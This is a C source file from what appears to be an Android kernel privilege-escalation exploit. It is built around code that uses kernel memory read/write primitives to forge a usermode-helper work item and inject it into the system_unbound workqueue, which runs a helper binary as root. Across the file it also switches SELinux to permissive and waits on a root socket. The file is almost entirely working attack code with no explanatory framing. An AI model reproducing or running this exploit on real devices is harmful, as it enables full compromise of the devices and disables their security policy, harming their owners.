#include "common.h"

#include <stdlib.h>
#include <sys/un.h>

int root_child_done;
uint32_t root_uid_before = 0xffffffff;
uint32_t root_uid_after = 0xffffffff;

#define ROOT_SOCKET_PATH "/data/local/tmp/temp_su.sock"
#define ROOT_HOLD_READY_SOCKET "cve43499_roothold"

struct umh_subprocess_info {
  uint8_t work[48];
  uint64_t complete;
  uint64_t path;
  uint64_t argv;
  uint64_t envp;
  int32_t wait;
  int32_t retval;
  uint64_t init;
  uint64_t cleanup;
  uint64_t data;
};

struct umh_completion {
  uint32_t done;
  uint32_t pad0;
  uint32_t lock;
  uint32_t pad1;
  uint64_t next;
  uint64_t prev;
};

struct umh_kernel_data {
  struct umh_completion completion;
  char path[256];
  char arg[16];
  char uid[16];
  uint64_t argv[4];
  uint64_t envp[1];
};

_Static_assert(sizeof(struct umh_subprocess_info) == 112,
               "subprocess_info layout");
_Static_assert(sizeof(struct umh_completion) == 32, "completion layout");

static int root_read_data(
    int fd, uintptr_t target, void *data, size_t len) {
  return pipe_phys_read_data(fd, target, data, len);
}

static int root_write_data(
    int fd, uintptr_t target, const void *data, size_t len) {
  return pipe_phys_write_data(fd, target, data, len);
}

static int root_read_global(
    int fd, uintptr_t target, void *data, size_t len) {
  return configfs_read_once(fd, target, data, len) == (ssize_t)len;
}

static int root_write_global(
    int fd, uintptr_t target, const void *data, size_t len) {
  return configfs_write_once(fd, target, data, len) == (ssize_t)len;
}

static int root_read64(
    int fd, uintptr_t target, uint64_t *value) {
  return value && root_read_data(fd, target, value, sizeof(*value));
}

static int root_read32(
    int fd, uintptr_t target, uint32_t *value) {
  return value && root_read_data(fd, target, value, sizeof(*value));
}

static int root_write64(int fd, uintptr_t target, uint64_t value) {
  return root_write_data(fd, target, &value, sizeof(value));
}

static int root_write32(int fd, uintptr_t target, uint32_t value) {
  return root_write_data(fd, target, &value, sizeof(value));
}

static int root_write64_exact(int fd, uintptr_t target, uint64_t value) {
  uint64_t readback = 0;
  return root_write64(fd, target, value) &&
         root_read64(fd, target, &readback) && readback == value;
}

static int root_write32_exact(int fd, uintptr_t target, uint32_t value) {
  uint32_t readback = 0;
  return root_write32(fd, target, value) &&
         root_read32(fd, target, &readback) && readback == value;
}

static int root_restore64(
    int fd, uintptr_t target, uint64_t ours, uint64_t old) {
  uint64_t current = 0;
  if (!root_read64(fd, target, &current)) {
    return 0;
  }
  if (current == old) {
    return 1;
  }
  return current == ours && root_write64_exact(fd, target, old);
}

static int root_restore32(
    int fd, uintptr_t target, uint32_t ours, uint32_t old) {
  uint32_t current = 0;
  if (!root_read32(fd, target, &current)) {
    return 0;
  }
  if (current == old) {
    return 1;
  }
  return current == ours && root_write32_exact(fd, target, old);
}

static int root_all_zero(const void *data, size_t size) {
  const uint8_t *bytes = data;
  for (size_t i = 0; i < size; i++) {
    if (bytes[i]) {
      return 0;
    }
  }
  return 1;
}

static int wake_system_unbound(void) {
  char slave_name[128];
  int master_fd = posix_openpt(O_RDWR | O_NOCTTY | O_CLOEXEC);
  if (master_fd < 0 || grantpt(master_fd) != 0 ||
      unlockpt(master_fd) != 0 ||
      ptsname_r(master_fd, slave_name, sizeof(slave_name)) != 0) {
    if (master_fd >= 0) {
      close(master_fd);
    }
    return 0;
  }

  int slave_fd = open(slave_name, O_RDWR | O_NOCTTY | O_CLOEXEC);
  if (slave_fd < 0) {
    close(master_fd);
    return 0;
  }
  int master_close = close(master_fd);
  int slave_close = close(slave_fd);
  return master_close == 0 && slave_close == 0;
}

static int root_socket_ready(void) {
  int fd = socket(AF_UNIX, SOCK_STREAM | SOCK_CLOEXEC, 0);
  if (fd < 0) {
    return 0;
  }

  struct sockaddr_un sun;
  memset(&sun, 0, sizeof(sun));
  sun.sun_family = AF_UNIX;
  snprintf(sun.sun_path, sizeof(sun.sun_path), "%s", ROOT_SOCKET_PATH);
  int ready = connect(fd, (struct sockaddr *)&sun, sizeof(sun)) == 0;
  close(fd);
  return ready;
}

#if defined(APP_PAYLOAD) && APP_PAYLOAD && \
    (!defined(APP_ROOT_REF_HOLDER_REQUIRED) || APP_ROOT_REF_HOLDER_REQUIRED)
static int root_hold_socket_ready(void) {
  int fd = socket(AF_UNIX, SOCK_STREAM | SOCK_CLOEXEC, 0);
  if (fd < 0) {
    return 0;
  }
  struct sockaddr_un address;
  memset(&address, 0, sizeof(address));
  address.sun_family = AF_UNIX;
  memcpy(address.sun_path + 1, ROOT_HOLD_READY_SOCKET,
         sizeof(ROOT_HOLD_READY_SOCKET) - 1);
  socklen_t address_length = (socklen_t)(
      offsetof(struct sockaddr_un, sun_path) +
      sizeof(ROOT_HOLD_READY_SOCKET));
  int ready = connect(fd, (struct sockaddr *)&address, address_length) == 0;
  close(fd);
  return ready;
}
#endif

static int install_workqueue_umh_root(int fd) {
  uintptr_t selinux_addr = data_addr(SELINUX_ENFORCING);
  uint8_t permissive = 0;
  uint8_t selinux_old = 0;
  uint8_t selinux_readback = 0;
  uintptr_t fake_work_addr = page_base + ROOT_UMH_WORK_OFF;
  uintptr_t umh_data_addr = page_base + ROOT_UMH_DATA_OFF;
  uint8_t saved_work[sizeof(struct umh_subprocess_info)];
  uint8_t saved_data[sizeof(struct umh_kernel_data)];
  uint8_t scratch_readback[sizeof(struct umh_kernel_data)];
  int scratch_saved = 0;
  int selinux_changed = 0;
  int inflight_changed = 0;
  int active_changed = 0;
  int refcnt_changed = 0;
  int list_prev_changed = 0;
  int published = 0;
  uint32_t complete_done = 0;
  int socket_ok = 0;
  int result = 0;
  struct umh_kernel_data umh_data;
  memset(&umh_data, 0, sizeof(umh_data));
  const char *root_umh_path = ROOT_UMH_PATH;
#if defined(APP_PAYLOAD) && APP_PAYLOAD
  const char *app_root_umh_path = getenv("CVE43499_ROOT_HELPER");
  if (!app_root_umh_path || app_root_umh_path[0] != '/') {
    pr_error("root umh missing CVE43499_ROOT_HELPER\n");
    return 0;
  }
  root_umh_path = app_root_umh_path;
#endif
  if (snprintf(umh_data.path, sizeof(umh_data.path), "%s", root_umh_path) >=
      (int)sizeof(umh_data.path)) {
    pr_error("root umh helper path too long\n");
    return 0;
  }
  snprintf(umh_data.arg, sizeof(umh_data.arg), "%s", "--umh");
  snprintf(umh_data.uid, sizeof(umh_data.uid), "%u", getuid());
  uintptr_t completion_addr =
      umh_data_addr + offsetof(struct umh_kernel_data, completion);
  uintptr_t wait_list_addr =
      completion_addr + offsetof(struct umh_completion, next);
  uintptr_t path_addr =
      umh_data_addr + offsetof(struct umh_kernel_data, path);
  uintptr_t arg_addr =
      umh_data_addr + offsetof(struct umh_kernel_data, arg);
  uintptr_t uid_addr =
      umh_data_addr + offsetof(struct umh_kernel_data, uid);
  uintptr_t argv_addr =
      umh_data_addr + offsetof(struct umh_kernel_data, argv);
  uintptr_t envp_addr =
      umh_data_addr + offsetof(struct umh_kernel_data, envp);
  umh_data.completion.next = wait_list_addr;
  umh_data.completion.prev = wait_list_addr;
  umh_data.argv[0] = path_addr;
  umh_data.argv[1] = arg_addr;
  umh_data.argv[2] = uid_addr;
  umh_data.argv[3] = 0;
  umh_data.envp[0] = 0;
  uint64_t umh_work_func = text_addr(CALL_USERMODEHELPER_EXEC_WORK);

  uintptr_t fake_work_end = fake_work_addr + sizeof(saved_work) - 1;
  uintptr_t umh_data_end = umh_data_addr + sizeof(saved_data) - 1;
  if (!is_direct_ptr(fake_work_addr) || !is_direct_ptr(umh_data_addr) ||
      fake_work_end < fake_work_addr || umh_data_end < umh_data_addr ||
      (fake_work_addr >> PAGE_SHIFT) != (fake_work_end >> PAGE_SHIFT) ||
      (umh_data_addr >> PAGE_SHIFT) != (umh_data_end >> PAGE_SHIFT) ||
      !(fake_work_end < umh_data_addr || umh_data_end < fake_work_addr)) {
    pr_error("root umh bad scratch spans work=%016zx-%016zx data=%016zx-%016zx\n",
             fake_work_addr, fake_work_end, umh_data_addr, umh_data_end);
    return 0;
  }
  if (!root_read_data(fd, fake_work_addr, saved_work, sizeof(saved_work)) ||
      !root_read_data(fd, umh_data_addr, saved_data, sizeof(saved_data))) {
    pr_error("root umh scratch old read failed\n");
    return 0;
  }
  scratch_saved = 1;
  if (!root_all_zero(saved_work, sizeof(saved_work)) ||
      !root_all_zero(saved_data, sizeof(saved_data))) {
    pr_error("root umh scratch not zero work=%d data=%d\n",
             root_all_zero(saved_work, sizeof(saved_work)),
             root_all_zero(saved_data, sizeof(saved_data)));
    return 0;
  }
  int selinux_read = root_read_global(
      fd, selinux_addr, &selinux_old, sizeof(selinux_old));
  if (!selinux_read) {
    pr_error("root umh selinux read failed direct=%016zx virtual=%016zx\n",
             selinux_addr, text_addr(SELINUX_ENFORCING));
    return 0;
  }
  if (selinux_old > 1) {
    pr_error("root umh bad selinux old=%u\n", selinux_old);
    return 0;
  }
  pr_info("root umh spans work=%016zx-%016zx data=%016zx-%016zx selinux=%016zx old=%u\n",
          fake_work_addr, fake_work_end, umh_data_addr, umh_data_end,
          selinux_addr, selinux_old);

  unlink(ROOT_SOCKET_PATH);

  uintptr_t wq_slot = data_addr(SYSTEM_UNBOUND_WQ);
  uint64_t wq_value = 0;
  uint64_t pwq_value = 0;
  uint64_t pool_value = 0;
  uint64_t pwq_wq_value = 0;
  if (!root_read_global(fd, wq_slot, &wq_value, sizeof(wq_value))) {
    pr_error("root umh workqueue slot read failed\n");
    goto cleanup;
  }
  uintptr_t wq = (uintptr_t)wq_value;
  if (!is_direct_ptr(wq) ||
      !root_read64(fd, wq + WQ_DFL_PWQ_OFF, &pwq_value)) {
    pr_error("root umh pwq read failed wq=%016zx\n", wq);
    goto cleanup;
  }
  uintptr_t pwq = (uintptr_t)pwq_value;
  if (!is_direct_ptr(pwq) ||
      !root_read64(fd, pwq + PWQ_POOL_OFF, &pool_value) ||
      !root_read64(fd, pwq + PWQ_WQ_OFF, &pwq_wq_value)) {
    pr_error("root umh pool read failed pwq=%016zx\n", pwq);
    goto cleanup;
  }
  uintptr_t pool = (uintptr_t)pool_value;
  uintptr_t pwq_wq = (uintptr_t)pwq_wq_value;
  if (!is_direct_ptr(wq) || !is_direct_ptr(pwq) ||
      !is_direct_ptr(pool) || pwq_wq != wq) {
    pr_error("root umh bad workqueue wq_slot=%016zx wq=%016zx "
             "pwq=%016zx pool=%016zx pwq_wq=%016zx\n",
             wq_slot, wq, pwq, pool, pwq_wq);
    return 0;
  }

  uintptr_t worklist = pool + POOL_WORKLIST_OFF;
  uint64_t list_next = 0;
  uint64_t list_prev = 0;
  uint32_t nr_idle = 0;
  for (int i = 0; i < 200; i++) {
    if (!root_read64(fd, worklist, &list_next) ||
        !root_read64(fd, worklist + sizeof(uint64_t), &list_prev) ||
        !root_read32(fd, pool + POOL_NR_IDLE_OFF, &nr_idle)) {
      pr_error("root umh pool state read failed\n");
      goto cleanup;
    }
    if (list_next == worklist && list_prev == worklist && nr_idle > 0) {
      break;
    }
    usleep(1000);
  }
  if (list_next != worklist || list_prev != worklist || nr_idle == 0) {
    pr_error("root umh pool busy pool=%016zx list=%016llx/%016llx "
             "head=%016zx idle=%u\n",
             pool, (unsigned long long)list_next,
             (unsigned long long)list_prev, worklist, nr_idle);
    goto cleanup;
  }

  uint32_t color = 0;
  uint32_t refcnt = 0;
  uint32_t nr_active = 0;
  uint32_t max_active = 0;
  if (!root_read32(fd, pwq + PWQ_WORK_COLOR_OFF, &color) ||
      !root_read32(fd, pwq + PWQ_REFCNT_OFF, &refcnt) ||
      !root_read32(fd, pwq + PWQ_NR_ACTIVE_OFF, &nr_active) ||
      !root_read32(fd, pwq + PWQ_MAX_ACTIVE_OFF, &max_active)) {
    pr_error("root umh pwq state read failed\n");
    goto cleanup;
  }
  if (color >= 16 || refcnt == 0 || nr_active >= max_active) {
    pr_error("root umh bad pwq state color=%u refcnt=%u active=%u/%u\n",
             color, refcnt, nr_active, max_active);
    goto cleanup;
  }

  uintptr_t inflight_addr =
      pwq + PWQ_NR_IN_FLIGHT_OFF + color * sizeof(uint32_t);
  uint32_t nr_inflight = 0;
  if (!root_read32(fd, inflight_addr, &nr_inflight) ||
      nr_inflight == UINT32_MAX || nr_active == UINT32_MAX ||
      refcnt == UINT32_MAX) {
    pr_error("root umh bad counters inflight=%u active=%u refcnt=%u\n",
             nr_inflight, nr_active, refcnt);
    goto cleanup;
  }
  uintptr_t fake_entry = fake_work_addr + WORK_ENTRY_OFF;
  uint64_t work_data = pwq | ((uint64_t)color << 4) | 5;
  struct umh_subprocess_info fake;
  memset(&fake, 0, sizeof(fake));
  memcpy(fake.work + WORK_DATA_OFF, &work_data, sizeof(work_data));
  memcpy(fake.work + WORK_ENTRY_OFF, &worklist, sizeof(worklist));
  memcpy(fake.work + WORK_ENTRY_OFF + sizeof(uint64_t),
         &worklist, sizeof(worklist));
  memcpy(fake.work + WORK_FUNC_OFF, &umh_work_func,
         sizeof(umh_work_func));
  fake.complete = completion_addr;
  fake.path = path_addr;
  fake.argv = argv_addr;
  fake.envp = envp_addr;

  int data_write = root_write_data(
      fd, umh_data_addr, &umh_data, sizeof(umh_data));
  int work_write = root_write_data(
      fd, fake_work_addr, &fake, sizeof(fake));
  if (!data_write || !work_write ||
      !root_read_data(fd, umh_data_addr, scratch_readback,
                      sizeof(umh_data)) ||
      memcmp(scratch_readback, &umh_data, sizeof(umh_data)) != 0 ||
      !root_read_data(fd, fake_work_addr, scratch_readback,
                      sizeof(fake)) ||
      memcmp(scratch_readback, &fake, sizeof(fake)) != 0) {
    pr_error("root umh scratch write/readback failed data=%d work=%d\n",
             data_write, work_write);
    goto cleanup;
  }

  if (selinux_old != permissive) {
    selinux_changed = 1;
    if (!root_write_global(fd, selinux_addr, &permissive,
                           sizeof(permissive)) ||
        !root_read_global(fd, selinux_addr, &selinux_readback,
                          sizeof(selinux_readback)) ||
        selinux_readback != permissive) {
      pr_error("root umh selinux write/readback failed now=%u\n",
               selinux_readback);
      goto cleanup;
    }
  }

  if (!root_read64(fd, worklist, &list_next) ||
      !root_read64(fd, worklist + sizeof(uint64_t), &list_prev) ||
      list_next != worklist || list_prev != worklist) {
    pr_error("root umh worklist changed before queue next=%016llx prev=%016llx\n",
             (unsigned long long)list_next,
             (unsigned long long)list_prev);
    goto cleanup;
  }

  inflight_changed = 1;
  int inflight_write = root_write32_exact(
      fd, inflight_addr, nr_inflight + 1);
  active_changed = 1;
  int active_write = inflight_write && root_write32_exact(
      fd, pwq + PWQ_NR_ACTIVE_OFF, nr_active + 1);
  refcnt_changed = 1;
  int refcnt_write = active_write && root_write32_exact(
      fd, pwq + PWQ_REFCNT_OFF, refcnt + 1);
  list_prev_changed = 1;
  int list_prev_write = refcnt_write && root_write64_exact(
      fd, worklist + sizeof(uint64_t), fake_entry);
  if (!list_prev_write ||
      !root_read64(fd, worklist, &list_next) || list_next != worklist) {
    pr_error("root umh prepublish write failed counters=%d/%d/%d prev=%d next=%016llx\n",
             inflight_write, active_write, refcnt_write, list_prev_write,
             (unsigned long long)list_next);
    goto cleanup;
  }

  int list_next_write = root_write64(fd, worklist, fake_entry);
  uint64_t published_next = 0;
  if (list_next_write ||
      (root_read64(fd, worklist, &published_next) &&
       published_next == fake_entry)) {
    published = 1;
  } else {
    pr_error("root umh publish failed ret=%d next=%016llx\n",
             list_next_write, (unsigned long long)published_next);
    goto cleanup;
  }
  pr_info("root umh queued wq=%016zx pwq=%016zx pool=%016zx "
          "work=%016zx entry=%016zx color=%u counters=%u/%u/%u "
          "writes=%d/%d/%d/%d/%d/%d/%d\n",
          wq, pwq, pool, fake_work_addr, fake_entry, color,
          nr_inflight, nr_active, refcnt, data_write, work_write,
          inflight_write, active_write, refcnt_write,
          list_prev_write, list_next_write);

  int wake_ok = 0;
  for (int i = 0; i < 8 && !complete_done; i++) {
    wake_ok |= wake_system_unbound();
    for (int j = 0; j < 250; j++) {
      if (!root_read32(fd, completion_addr, &complete_done)) {
        pr_error("root umh completion read failed\n");
        goto cleanup;
      }
      if (complete_done) {
        break;
      }
      usleep(1000);
    }
  }

  uint32_t retval_value = 0;
  if (complete_done &&
      !root_read32(fd,
                   fake_work_addr +
                       offsetof(struct umh_subprocess_info, retval),
                   &retval_value)) {
    pr_error("root umh retval read failed\n");
    goto cleanup;
  }
  int32_t umh_retval = (int32_t)retval_value;
  if (complete_done) {
    for (int i = 0; i < 200; i++) {
      if (root_socket_ready()) {
        socket_ok = 1;
        break;
      }
      usleep(10000);
    }
  }

  pr_info("root umh result wake=%d complete=%u retval=%d socket=%d\n",
          wake_ok, complete_done, umh_retval, socket_ok);
  result = socket_ok;

cleanup:
  if (!published) {
    int rollback_ok = 1;
    if (list_prev_changed) {
      rollback_ok &= root_restore64(
          fd, worklist + sizeof(uint64_t), fake_entry, list_prev);
    }
    if (refcnt_changed) {
      rollback_ok &= root_restore32(
          fd, pwq + PWQ_REFCNT_OFF, refcnt + 1, refcnt);
    }
    if (active_changed) {
      rollback_ok &= root_restore32(
          fd, pwq + PWQ_NR_ACTIVE_OFF, nr_active + 1, nr_active);
    }
    if (inflight_changed) {
      rollback_ok &= root_restore32(
          fd, inflight_addr, nr_inflight + 1, nr_inflight);
    }
    if (!rollback_ok) {
      pr_error("root umh prepublish rollback failed\n");
    }
  } else if (!complete_done) {
    pr_error("root umh published but incomplete; scratch retained\n");
  }

  if (scratch_saved && (!published || complete_done)) {
    int work_restore = root_write_data(
        fd, fake_work_addr, saved_work, sizeof(saved_work));
    int data_restore = root_write_data(
        fd, umh_data_addr, saved_data, sizeof(saved_data));
    int work_read = root_read_data(
        fd, fake_work_addr, scratch_readback, sizeof(saved_work));
    int work_match = work_read &&
                     memcmp(scratch_readback, saved_work,
                            sizeof(saved_work)) == 0;
    int data_read = root_read_data(
        fd, umh_data_addr, scratch_readback, sizeof(saved_data));
    int data_match = data_read &&
                     memcmp(scratch_readback, saved_data,
                            sizeof(saved_data)) == 0;
    pr_info("root umh scratch restore work=%d/%d data=%d/%d\n",
            work_restore, work_match, data_restore, data_match);
    if (!work_restore || !work_match || !data_restore || !data_match) {
      pr_error("root umh scratch restore failed\n");
    }
  }

  if (!result && selinux_changed && (!published || complete_done)) {
    uint8_t current = 0xff;
    int read_ok = root_read_global(fd, selinux_addr, &current,
                                   sizeof(current));
    int restore_ok = read_ok &&
        (current == selinux_old ||
         (current == permissive &&
          root_write_global(fd, selinux_addr, &selinux_old,
                            sizeof(selinux_old)) &&
          root_read_global(fd, selinux_addr, &current, sizeof(current)) &&
          current == selinux_old));
    pr_info("root umh selinux rollback=%d old=%u now=%u\n",
            restore_ok, selinux_old, current);
    if (!restore_ok) {
      pr_error("root umh selinux rollback failed\n");
    }
  } else if (!result && selinux_changed) {
    pr_error("root umh selinux retained while published work is incomplete\n");
  } else if (result) {
    pr_info("root umh selinux left=%u intended root state old=%u\n",
            permissive, selinux_old);
  }

  root_child_done = socket_ok;
  root_uid_after = socket_ok ? 0 : root_uid_before;
  return result;
}

int install_android_root(int fd) {
  root_uid_before = getuid();
  pr_info("root configfs-pipe start uid=%u fd=%d\n", root_uid_before, fd);
  int installed = install_workqueue_umh_root(fd);
#if defined(APP_PAYLOAD) && APP_PAYLOAD
#if defined(APP_ROOT_REF_HOLDER_REQUIRED) && \
    !APP_ROOT_REF_HOLDER_REQUIRED
  if (installed) {
    pr_info("root reference holder not required by target route\n");
  }
#else
#if defined(QEMU_FORCED_SLIDE_TEST) && QEMU_FORCED_SLIDE_TEST
  if (installed) {
    pr_info("root p0 reference holder not required for qemu forced slide\n");
  }
#else
#if defined(APP_PHYS_VIRTUAL_BASE_ORACLE) && APP_PHYS_VIRTUAL_BASE_ORACLE
  if (installed && (p0_gate_page_struct || p0_probe_page_struct)) {
#else
  if (installed) {
#endif
    int holder_ready = 0;
    for (int attempt = 0; attempt < 200; attempt++) {
      if (root_hold_socket_ready()) {
        holder_ready = 1;
        break;
      }
      usleep(10000);
    }
    pr_info("root p0 reference holder ready=%d\n", holder_ready);
    if (!holder_ready) {
      root_child_done = 0;
      root_uid_after = root_uid_before;
      return 0;
    }
#if defined(APP_PHYS_VIRTUAL_BASE_ORACLE) && APP_PHYS_VIRTUAL_BASE_ORACLE
  } else if (installed) {
    pr_info("root p0 reference holder not required for cached virtual base\n");
#endif
  }
#endif
#endif
#endif
  return installed;
}
